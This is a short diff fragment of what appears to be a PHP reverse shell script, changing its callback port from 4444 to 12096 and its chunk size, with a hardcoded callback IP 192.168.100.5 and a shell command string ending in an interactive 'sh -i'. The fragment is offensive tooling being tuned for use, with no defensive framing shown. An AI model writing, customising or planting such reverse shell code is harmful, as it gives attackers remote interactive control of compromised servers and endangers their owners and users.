@@ -4,9 +4,9 @@
 	set_time_limit (0);
 	$VERSION = "1.0";
 	$ip = '192.168.100.5';
-	$port = 4444; 
+	$port = 12096; 
 	
-	$chunk_size = 1400;
+	$chunk_size = 8192;
 	$write_a = null;
 	$error_a = null;
 	$shell = 'uname -a; w; id; sh -i';
